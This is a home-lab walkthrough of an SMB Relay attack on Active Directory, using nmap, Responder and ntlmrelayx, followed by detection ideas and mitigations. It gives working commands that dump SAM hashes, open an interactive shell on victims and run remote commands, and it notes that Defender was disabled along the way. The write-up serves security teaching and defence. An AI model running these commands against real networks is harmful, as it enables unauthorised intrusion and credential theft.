# SMB Relay – Initial Attack Vector (Active Directory Home Lab)

> **Project:** Active Directory Home Lab   
> **Module:** Attacking Active Directory → Initial Attack Vectors → SMB Relay

---

# Table of Contents

- [Overview](#overview)
- [Learning Objectives](#learning-objectives)
- [Lab Environment](#lab-environment)
- [Attack Overview](#attack-overview)
- [Prerequisites](#prerequisites)
- [Attack Workflow](#attack-workflow)
- [Step 1 - Identify Hosts Without SMB Signing](#step-1---identify-hosts-without-smb-signing)
- [Step 2 - Configure and Run Responder](#step-2---configure-and-run-responder)
- [Step 3 - Configure SMB Relay](#step-3---configure-smb-relay)
- [Step 4 - Wait for Authentication](#step-4---wait-for-authentication)
- [Step 5 - Relay Successful](#step-5---relay-successful)
- [Obtaining an Interactive Shell](#obtaining-an-interactive-shell)
- [Remote Command Execution](#remote-command-execution)
- [Attack Summary](#attack-summary)
- [Detection Opportunities](#detection-opportunities)
- [Mitigation Strategies](#mitigation-strategies)
- [Lessons Learned](#lessons-learned)

---

# Overview

SMB Relay is one of the most effective attacks against legacy Windows environments where **SMB Signing is not enforced**.

Unlike traditional NTLM attacks where captured hashes are cracked offline, SMB Relay forwards the victim's authentication request to another machine. If the victim possesses administrative privileges on the target system, the attacker immediately gains code execution or shell access without ever cracking the password.

This attack is commonly paired with **Responder** and **Impacket's ntlmrelayx.py**.

---

# Learning Objectives

After completing this lab you should understand:

- How SMB Relay works
- Why SMB Signing is important
- How NTLM authentication can be relayed
- Enumerating systems vulnerable to SMB Relay
- Using Responder safely with relay attacks
- Using ntlmrelayx.py
- Obtaining command execution
- Defensive mitigations against SMB Relay

---

# Lab Environment

| Machine | IP Address | Role |
|----------|-----------|------|
| Kali Linux | 192.168.126.128 | Attacker |
| Domain Controller | 192.168.126.139 | Windows Server |
| ballen | 192.168.126.140 | Domain Client |
| ckent | 192.168.126.141 | Domain Client |

---

# Attack Overview

The attack follows these stages:

```
Victim
      │
      │ NTLM Authentication
      ▼
Responder captures request
      │
      ▼
ntlmrelayx relays authentication
      │
      ▼
Target accepts authentication
      │
      ▼
Remote Code Execution /
Hash Dump /
Interactive Shell
```

Unlike LLMNR poisoning, no password cracking is required.

---

# Prerequisites

The attack is only successful when:

- SMB Signing is disabled or not enforced
- The victim authenticates over SMB
- The authenticated user has local administrator privileges on the target machine
- The attacker is positioned to intercept authentication traffic

---

# Attack Workflow

```
Enumerate
      ↓
Identify SMB Signing Disabled
      ↓
Run Responder
      ↓
Run ntlmrelayx
      ↓
Victim Authenticates
      ↓
Relay Authentication
      ↓
Gain Access
```

---

# Step 1 - Identify Hosts Without SMB Signing

Before launching the attack, identify systems that do not require SMB Signing.

SMB Signing prevents tampering with SMB traffic and completely breaks SMB Relay attacks.

Run:

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.126.0/24 -Pn
```

The scan identifies hosts where SMB Signing is disabled or optional.

These systems become valid relay targets.

![](https://github.com/WNobsi/SMB-Relay-Active-Directory-Attack-Vector/blob/3ad6e25c813c1724325c911de2b28a5211bb1aa6/images/nmap_scan_for_smb_script.png)

---

### Pentester Observation

SMB Relay cannot succeed against systems where SMB Signing is enforced. Enumerating vulnerable hosts first prevents unnecessary attack attempts and reduces noise.

---

# Step 2 - Configure and Run Responder

Responder performs the network poisoning required to capture NTLM authentication.

Before launching Responder, edit its configuration.

Disable:

```
SMB Server = Off
HTTP Server = Off
```

These services must remain disabled because **ntlmrelayx** will handle the SMB connection.

If both applications attempt to use SMB simultaneously, the relay attack fails.

Start Responder:

```bash
sudo responder -I eth0 -dFwv
```

Parameter explanation:

| Option | Purpose |
|---------|----------|
| -I | Network interface |
| -d | DHCP support |
| -F | Force Proxy Authentication |
| -w | WPAD support |
| -v | Verbosity |

Responder now waits for incoming authentication requests.

---

### Pentester Observation

Unlike the previous LLMNR Poisoning attack, the goal here is **not** to capture hashes for cracking. Instead, authentication will immediately be forwarded to another host.

---

# Step 3 - Configure SMB Relay

Create a file containing relay targets.

Example:

```
192.168.126.140
192.168.126.141
```

![](https://github.com/WNobsi/SMB-Relay-Active-Directory-Attack-Vector/blob/3ad6e25c813c1724325c911de2b28a5211bb1aa6/images/saving_target_list.png)

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
Start ntlmrelayx.

Option explanation:

| Option | Description |
|---------|-------------|
| -tf | Target list |
| -smb2support | Enables SMBv2 compatibility |

ntlmrelayx now waits for incoming NTLM authentication from Responder.

---

### Pentester Observation

The relay server remains idle until a victim attempts SMB authentication.

---

# Step 4 - Wait for Authentication

Once a victim attempts to authenticate,

Responder intercepts the request and forwards it to ntlmrelayx.

Instead of storing the hash,

the authentication is replayed directly to one of the vulnerable targets.

If authentication succeeds,

the relay attack immediately executes.

Authentication is simply forwarded.

---

# Step 5 - Relay Successful

If the authenticated account possesses local administrator privileges,

ntlmrelayx dumps the SAM database.

Example:

```
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
clarkkent
```

NTLM password hashes become available for later analysis.

![](https://github.com/WNobsi/SMB-Relay-Active-Directory-Attack-Vector/blob/3ad6e25c813c1724325c911de2b28a5211bb1aa6/images/running_ntlmrelayx_hash_capture.png)

---

### Pentester Observation

Obtaining local administrator hashes greatly increases opportunities for lateral movement and privilege escalation.

---

# Obtaining an Interactive Shell

Instead of dumping hashes,

ntlmrelayx can launch an interactive shell.

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

After a successful relay we get to know the IP address and port:

```
127.0.0.1:11000
```

![](https://github.com/WNobsi/SMB-Relay-Active-Directory-Attack-Vector/blob/3ad6e25c813c1724325c911de2b28a5211bb1aa6/images/ntlmrelayx_tcp_shell.png)

Connect using:

```bash
nc 127.0.0.1 11000
```
![](https://github.com/WNobsi/SMB-Relay-Active-Directory-Attack-Vector/blob/3ad6e25c813c1724325c911de2b28a5211bb1aa6/images/netcat.png)
![](https://github.com/WNobsi/SMB-Relay-Active-Directory-Attack-Vector/blob/3ad6e25c813c1724325c911de2b28a5211bb1aa6/images/smb_shell.png)

You now have an interactive shell on the victim.

---

### Pentester Observation

Interactive shells provide greater flexibility than one-time command execution and enable manual post-exploitation activities.

---

# Remote Command Execution

Individual commands may also be executed.

Example:

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

The command executes immediately after authentication.

During this lab, Windows Defender blocked execution until Virus & Threat Protection was disabled.

Once Defender was disabled,

the relay completed successfully.

![](https://github.com/WNobsi/SMB-Relay-Active-Directory-Attack-Vector/blob/3ad6e25c813c1724325c911de2b28a5211bb1aa6/images/ntlmrelayx_console.png)

---

### Pentester Observation

Modern endpoint protection products can interfere with relay attacks. Even if authentication succeeds, post-exploitation actions may still be prevented.

---

# Attack Summary

```
Scan Network
      │
      ▼
Find Hosts Without SMB Signing
      │
      ▼
Run Responder
      │
      ▼
Run ntlmrelayx
      │
      ▼
Victim Authenticates
      │
      ▼
Authentication Relayed
      │
      ▼
Hash Dump
Interactive Shell
Command Execution
```

---

# Detection Opportunities

Blue teams should monitor for:

- Unusual NTLM authentication traffic
- Multiple SMB authentication attempts
- Responder signatures
- WPAD poisoning
- LLMNR/NBT-NS traffic
- ntlmrelayx artifacts
- Unexpected SMB sessions
- Remote service creation
- PsExec-like behavior
- Event ID 4624 anomalies

---

# Mitigation Strategies

## Enable SMB Signing

**Pros**

- Completely prevents SMB Relay

**Cons**

- Slight performance impact

---

## Disable NTLM Authentication

**Pros**

- Eliminates NTLM Relay attacks

**Cons**

- Legacy applications may fail

---

## Account Tiering

Restrict privileged accounts to administrative systems only.

This greatly reduces the impact of successful relay attacks.

---

## Restrict Local Administrator Rights

Prevent domain users from possessing unnecessary administrative privileges.

Even if authentication is relayed successfully,

the attacker gains limited access.

---

# Lessons Learned

Throughout this lab we learned:

- SMB Relay is significantly more dangerous than offline hash cracking.
- Password cracking is unnecessary.
- Administrative privileges determine the attack's success.
- SMB Signing remains one of the strongest defenses.
- Responder and ntlmrelayx complement each other during relay attacks.
- Relay attacks are highly effective in poorly configured Active Directory environments.

---

## Disclaimer

This project was conducted in an isolated Active Directory Home Lab for educational and defensive security research purposes only.

Do **not** perform these techniques against systems without explicit authorization.
